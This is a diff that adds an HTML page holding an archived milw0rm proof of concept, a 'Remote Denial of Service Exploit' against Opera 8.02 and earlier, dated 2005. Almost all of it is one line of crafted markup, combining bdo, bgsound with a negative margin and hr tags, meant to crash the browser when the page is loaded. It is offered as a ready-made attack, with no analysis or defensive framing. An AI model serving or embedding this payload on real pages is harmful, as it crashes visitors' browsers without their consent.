@@ -1,0 +1,18 @@
+<html>
+<head>
+<title>Opera <= 8.02 Remote Denial of Service Exploit</title>
+<pre>
+&lt;!--
+
+Vulnerable: Opera 8.02 and below
+      Date: 19.05.2005
+Discovered: posidron@tripbit.net
+
+--&gt;
+
+&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;bdo&gt;A&lt;bgsound style=&quot;margin:-99;&quot;&gt;A&lt;hr&gt;A&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;
+
+# milw0rm.com [2005-10-16]
+</pre>
+</html>
+
